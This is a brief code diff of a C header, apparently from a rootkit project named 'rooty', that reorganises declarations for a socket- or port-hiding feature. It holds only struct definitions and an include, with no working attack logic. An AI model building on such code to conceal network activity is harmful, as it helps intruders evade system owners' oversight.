@@ -1,12 +1,9 @@
 #ifndef SOCKET_HIDE_H
 #define SOCKET_HIDE_H
 
-#define TMPSZ 150
+#include "common/rooty_uapi.h"
 
-struct s_port_args
-{
-    unsigned short port;
-};
+#define TMPSZ 150
 
 struct hidden_port
 {
